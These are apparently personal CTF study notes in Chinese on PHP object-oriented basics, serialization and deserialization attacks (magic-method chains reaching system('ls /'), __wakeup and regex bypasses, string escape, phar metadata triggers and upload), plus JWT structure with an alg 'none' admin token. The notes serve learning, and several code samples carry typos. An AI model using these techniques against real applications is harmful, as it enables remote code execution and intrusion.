**继承一个抽象类时。，子类必须定义父类中的所有抽象方法** 

**抽象类的作用是保证他的子类都有指定的共同方法，方便外部调用，而不关心内部的具体实现总结：**

**抽象类不能实例化，只能实例化其子类**

**抽象类可以有具体方法，但至少应该有一个抽象方法**

**继承抽象类的子类必须实现抽象类的所有抽象方法**

### 接口

使用`interface`关键字定义抽象类

接口的特性：

**接口中定义的所有方法都必须是公有**

**要实现接口**

即将

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eat</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

变为

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eat</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;肉&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

接口允许继承，实现接口，也允许实现多个接口

### trait

![image-20221010162559423](https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221010162559423.png)

trait可以组合

![image-20221010162727184](https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221010162727184.png)

## php的序列化与反序列化

### 序列化的概念

**将对象或者数组转化为可存储的字符串。**

序列化的目的是方便数据的传输和存储，在PHP中，序列化和反序列化一般用做缓存，比如session缓存和cookie等。

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#创建一个类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&#x27;sdfsdfa&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$b</span> = <span class="number">1111</span>;</span><br><span class="line">    <span class="keyword">private</span>  <span class="variable">$c</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">displayVar</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>(); <span class="comment">//实例化对象</span></span><br><span class="line"><span class="variable">$d</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$d</span>);<span class="comment">//序列化对象</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$d</span>);<span class="comment">//输出序列化后的结果</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

运行结果：

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span>(<span class="number">73</span>) <span class="string">&quot;O:4:&quot;</span>test<span class="string">&quot;:3:&#123;s:1:&quot;</span>a<span class="string">&quot;;s:7:&quot;</span>sdfsdfa<span class="string">&quot;;s:4:&quot;</span>\<span class="number">000</span>*\<span class="number">000</span>b<span class="string">&quot;;i:1111;s:7:&quot;</span>\<span class="number">000</span>test\<span class="number">000</span>c<span class="string">&quot;;b:0;&#125;&quot;</span></span><br></pre></td></tr></table></figure>

O:4:---代表O(object)代表对象类型，如果是a(array)那就是数组类型;4是对象名称的长度test是对象名称3代表有三个成员。

s:1:"a";s:7:"sdfsdfa"---第一个s表示变量名称是字符串类型，1是变量名称的长度，a是变量名称；第二个s代表变量值是字符串类型，7代表变量值的长，后面是变量的值。

**s:4:"\000*\000b";i:1111;---protected属性输出时一般需要url编码，若在本地存储更推荐采用base64编码的形式**

序列化的时候格式是%00%00成员名*

一个%00代表一个字节，所以protected有两个%00，在加上*和变量名称长度一共4个字节

**s:7:"\000test\000c";b:0;---private属性**

private属性序列化的时候格式是%00类名%00成员名；

两个%00加上类名的4个字节和成员名的一个字节就是7个字节

serialize()函数只对类的**属性**序列化，不序列化**方法**

### 反序列化的概念

**将序列化后的字符串转换回对象或者数组。**

我们重新用上面的例子并把序列化的结果写入一个文本中存储：并读取内容进行反序列化

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&#x27;sdfsdfa&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$b</span> = <span class="number">1111</span>;</span><br><span class="line">    <span class="keyword">private</span>  <span class="variable">$c</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">displayVar</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="variable">$d</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$d</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;1.txt&#x27;</span>,<span class="variable">$d</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$d</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;1.txt&#x27;</span>));</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$d</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$d</span>-&gt;a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

**反序列化的时候要保证有该类存在，因为没有序列化方法，所以我们反序列化回来还要依靠该类的方法进行**

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&#x27;sdfsdfa&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$b</span> = <span class="number">1111</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$c</span> = flase;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">displayVar90</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$d</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;1.txr&#x27;</span>));</span><br><span class="line"><span class="title function_ invoke__">print_</span>(<span class="variable">$d</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$d</span>-&gt;a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

![image-20221010174812167](https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221010174812167.png)

## php中的魔术方法

是每个对象默认就有的方法，不管定义不定义，都存在

### 反序列化中常见的魔术方法

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">__wakeup</span>()<span class="comment">//执行unserialize()时，先会调用这个函数</span></span><br><span class="line"><span class="title function_ invoke__">__sleep</span>()<span class="comment">//执行srialize()时，先会调用这个函数</span></span><br><span class="line"><span class="title function_ invoke__">__desruct</span>()<span class="comment">//对象被销毁时触发，</span></span><br><span class="line"><span class="title function_ invoke__">__construct</span>()<span class="comment">//对象被new时执行</span></span><br><span class="line"><span class="title function_ invoke__">__call</span>()<span class="comment">//在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="title function_ invoke__">__callStatic</span>() <span class="comment">//在静态上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="title function_ invoke__">__get</span>() <span class="comment">//用于从不可访问的属性读取数据或者不存在这个键都会调用此方法</span></span><br><span class="line"><span class="title function_ invoke__">__set</span>() <span class="comment">//用于将数据写入不可访问的属性</span></span><br><span class="line"><span class="title function_ invoke__">__isset</span>() <span class="comment">//在不可访问的属性上调用isset()或empty()触发</span></span><br><span class="line"><span class="title function_ invoke__">__unset</span>() <span class="comment">//在不可访问的属性上使用unset()时触发</span></span><br><span class="line"><span class="title function_ invoke__">__toString</span>() <span class="comment">//把类当作字符串使用时触发</span></span><br><span class="line"><span class="title function_ invoke__">__invoke</span>() <span class="comment">//当尝试将对象调用为函数时触发</span></span><br><span class="line"><span class="title function_ invoke__">__set_state</span>()<span class="comment">//自5.10起当调用var_export()导出类时，此静态方法会被调用</span></span><br><span class="line"><span class="title function_ invoke__">__debuginfo</span>()<span class="comment">//当调用var_dump时，调用类的这个方法，显示类的属性具体结构和值</span></span><br></pre></td></tr></table></figure>

#### __desruct()//对象被销毁时触发，

可以没有new，用highight_file 和is_dir触发

这些都可

![image-20221011223642039](https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221011223642039.png)

![image-20221011223712308](https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221011223712308.png)

![image-20221010181558207](https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221010181558207.png)

![image-20221010183017339](https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221010183017339.png)

![image-20221010191658696](https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221010191658696.png)

1

![image-20221010194702023](https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221010194702023.png)

只会输出c且输出第三项数组，故改为



![image-20221010194525255](https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221010194525255.png)

<img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221010194824688.png"/>

将

![image-20221010194259222](https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221010194259222.png)

改为

![image-20221010194327943](https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221010194327943.png)

再将name属性变为system，使得

![image-20221010194418678](https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221010194418678.png)

![image-20221010194938199](https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221010194938199.png)

输出system

就可以输出system('ls /')

## 反序列化中的绕过

绕过wakeup方法，将对象数量改为大于真实数量

### +号绕过正则

不允许输入O：7这种开头，可以在数字前面加个“+”绕过，0：+7

### 引用绕过

php中也可以

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">&amp;<span class="variable">$srt</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;love&quot;</span>.<span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;you&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">add</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;<span class="comment">//输出loveyou</span></span><br></pre></td></tr></table></figure>

因为&将str的地址指向了a，。

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">构造</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;username=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;passward=&amp;<span class="variable language_">$this</span>-&gt;secret;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;code =<span class="string">&quot;phpinfo();&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

### 16进制绕过

如果在反序列化后的字符串将s变更为S后，就会将里面的字符按照\xx格式16进制读取，绕过对关键字的检测

### Exception绕过

![image-20221010224344206](https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221010224344206.png)

### 字符串逃逸

![image-20221010225237057](https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221010225237057.png)

这时我们用多出来三位如果我们把这三位输入`;"}`就可以完成闭合，这样它后面的属性就被扔掉了

![image-20221010225552508](https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221010225552508.png)

![image-20221010230830669](https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221010230830669.png)

## phar

可以看看这个

https://blog.csdn.net/weixin_63231007/article/details/125107789?app_version=5.9.0&code=app_1562916241&csdn_share_tail=%7B%22type%22%3A%22blog%22%2C%22rType%22%3A%22article%22%2C%22rId%22%3A%22125107789%22%2C%22source%22%3A%22J1nmu%22%7D&uLinkId=usr1mkqgl919blen&utm_source=app

### phar包含

我们印象中的文件包含

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include &quot;flag.hpp&quot;;</span><br></pre></td></tr></table></figure>

php底层是这么处理的,使用了file协议

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include &quot;file://flag.php&quot;;</span><br></pre></td></tr></table></figure>

那么要使用phar中的文件，也要使用相应的协议

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include &quot;phar://com.ctfshow.fileUtil.phar/file.php&quot;;</span><br></pre></td></tr></table></figure>

phar，全称为PHP Archive，phar扩展提供了一种将整个PHP应用程序放入.phar文件中的方法，以方便移动、安装。.phar文件的最大特点是将几个文件组合成一个文件的便捷方式，.phar文件提供了一种将完整的PHP程序分布在一个文件中并从该文件中运行的方法。

可以将phar文件类比为一个压缩文件

### phar怎么用

先搞一个flag.php

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;flag=&#123;afklglkadjgklda&#125;&quot;;</span><br></pre></td></tr></table></figure>

然后

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//建立一个phar包</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;flag.phar&quot;</span>);</span><br><span class="line"><span class="comment">//将flag.php放入project文件夹</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">buildFromDirectory</span>(<span class="string">&quot;./project&quot;</span>);</span><br><span class="line"><span class="comment">//索引文件index.php   flag.phar包含文件flag.php</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">createDefaultStub</span>(<span class="string">&quot;index.php&quot;</span>,<span class="string">&quot;flag.php&quot;</span>));</span><br></pre></td></tr></table></figure>

### phar的反序列化

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">//文件上传</span><br><span class="line">//不让上传php int .htaccess</span><br><span class="line">//phar</span><br><span class="line">file_exists()</span><br><span class="line">这时文件头可控的情况下，我们就可以触发phar协议，把它进行序列化 反序列化来触发</span><br></pre></td></tr></table></figure>

setmetadata会自动反序列化

试试phar反序列化,能否生成

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//成功 析构方法输出&quot;hack class&quot;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hack</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hack class&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$h</span> = <span class="keyword">new</span> <span class="title function_ invoke__">hack</span>();<span class="comment">//实例化</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;flag.phar&#x27;</span>);<span class="comment">//建立一个包</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">buildFromDirectory</span>(<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>).<span class="string">&#x27;/project&#x27;</span>);<span class="comment">//放入project文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$h</span>);;</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">createDefaultStub</span>(<span class="string">&#x27;flag.php&#x27;</span>,<span class="string">&#x27;index.php&#x27;</span>));</span><br></pre></td></tr></table></figure>

可以看到析构方法执行

![image-20221024233641584](https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221024233641584.png)

下一步，只是将index.php include.php 文件内容交换。就是让上面的代码成为首页

在include.里面写入。类比序列化之后的输出

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hack</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hack class&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;phar://flag.phar&quot;</span>);</span><br></pre></td></tr></table></figure>

![image-20221024234026650](https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221024234026650.png)

可以找到phar反序列化的文件

![image-20221024234245478](https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221024234245478.png)

将phar协议去掉就不行了

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class hack&#123;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        echo &quot;hack class&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">file_exists(&quot;flag.phar&quot;);</span><br></pre></td></tr></table></figure>

下面是文件包含的情况，不需要Phar头，不仅执行里面的代码，还会制动反序列化类，还会执行类中的析构方法。

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">；</span><br><span class="line"></span><br><span class="line">class hack&#123;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        echo &quot;hack class&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//file_exists(&quot;phar://flag.phar&quot;);</span><br><span class="line">include &quot;flag.phar&quot;;</span><br></pre></td></tr></table></figure>

![image-20221024234545851](https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221024234545851.png)

C源代码 1900行左右，nnd好像没有

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/php/php-src/blob/master/main/streams/streams.c</span><br></pre></td></tr></table></figure>

![image-20221024235652872](https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221024235652872.png)

这时候将首页由index.php 换位index.txt,就可以通过phar序列化反序列化类。

![image-20221024235753994](https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221024235753994.png)



![image-20221025000002875](https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221025000002875.png)

这样也可以执行恶意类的销毁方法，还可以用highlight_file//file_get_contents

![image-20221024235917072](https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221024235917072.png)

///

phar协议进行包含

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&quot;phar://com.ctfshow.fileUtill.phar/file.php&quot;</span>;</span><br></pre></td></tr></table></figure>

打包进去一个flag.php

用phar上传文件，正常抓包，发到重发器关闭拦截

改为POST,

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=my.phar&amp;content=       <span class="comment">//要有my.phar文件</span></span><br></pre></td></tr></table></figure>

![image-20221011224353656](https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221011224353656.png)

右键**Paste from filem,**打开my.phar

![image-20221011224533565](https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221011224533565.png)

<img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221011224702972.png"/>

看是否成功

2.00

# 9.0php专题



## 认识tphp

## tphp的漏洞

## tphp的漏洞

## 的反序列化

# JWT

https://baobao555.tech/archives/40#1.%E4%BB%80%E4%B9%88%E6%98%AFjwt

## JWT结构

JWT由3部分组成：标头（Header）、有效载荷（Payload）、签名（Signature）。在传输的时候，会将JWT的3部分分别进行Base64编码后用`.`进行连接形成最终传输的字符串

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ewogICJhbGciOiAibm9uZSIsCiAgInR5cCI6ICJKV1QiCn0K.ewogICAgInN1YiI6ICIxMjM0NTY3ODkwIiwKICAgICJuYW1lIjogIkppbm11dSIsCiAgICAiYWRtaW4iOiB0cnVlCn0=.SE1BQ1NIQTI1NihiYXNlNjRVcmxFbmNvZGUoaGVhZGVyKSArICIuIiArIGJhc2U2NFVybEVuY29kZShwYXlsb2FkKSwgd2hvYW1pKQ==</span><br></pre></td></tr></table></figure>

### Header

`JWT头`是一个描述JWT数据的JSON对象，alg属性表示签名使用的算法，默认为HMAC SHA256（写为HS256）；typ属性表示令牌的类型，JWT令牌统一写为JWT。最后，使用Base64 URL算法将上述JSON对象转换为字符串保存

<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">	<span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span> <span class="string">&quot;JWT&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

### Payload

`有效载荷`部分，JWT的主体内容部分，也是一个`JSON对象`，包含需要传递的数据。JWT指定七个默认字段供选择

<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">iss<span class="punctuation">:</span> 发行人</span><br><span class="line">exp<span class="punctuation">:</span> 到期时间</span><br><span class="line">sub<span class="punctuation">:</span> 主体</span><br><span class="line">aud<span class="punctuation">:</span> 用户</span><br><span class="line">nbf<span class="punctuation">:</span> 在此之前不可用</span><br><span class="line">iat<span class="punctuation">:</span> 发布时间</span><br><span class="line">jti<span class="punctuation">:</span> JWT ID用于标识该JWT</span><br></pre></td></tr></table></figure>

除以上默认字段外，我们还可以自定义私有字段，`一般会把包含用户信息的数据放到payload中`，如下例:

<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;sub&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1234567890&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Jinmuu&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;admin&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

**注意要考**，默认情况下JWT是未加密的，因为只是采用base64算法，拿到JWT字符串后可以转换回原本的JSON数据，任何人都可以解读其内容，因此不要构建隐私信息字段，比如用户的密码一定不能保存到JWT中，以防止信息泄露。JWT只是适合在网络中传输一些非敏感的信息

### Signnature

`签名哈希`部分是对上面两部分数据签名，需要使用base64编码后的header和payload数据，通过指定的算法生成哈希，以确保数据不会被篡改。首先，需要指定一个密钥（secret）。该密码仅仅为保存在服务器中，并且不能向用户公开。然后，使用header中指定的签名算法（默认情况下为HMAC SHA256）根据以下公式生成签名

<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HMACSHA256(base64UrlEncode(header) + <span class="string">&quot;.&quot;</span> + base64UrlEncode(payload)<span class="punctuation">,</span> whoami)</span><br><span class="line">HMACSHA256(base64UrlEncode(header)+<span class="string">&quot;.&quot;</span>+base64UrlEncode(payload)<span class="punctuation">,</span>secret)</span><br></pre></td></tr></table></figure>

计算出签名哈希后；JWT头，有效载荷和签名哈希的三个部分组合成一个字符串，每个部分用`.`分割就构成了整个JWT对象

![image-20200912220832713](https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20200912220832713.png)

注意JWT每部分的作用，在服务器端接受到客户端发送过来的JWT token之后：

`header`和`payload`可以直接利用base64就码出原文，从中获取哈希签名的算法，从`payload`中获取有效数据

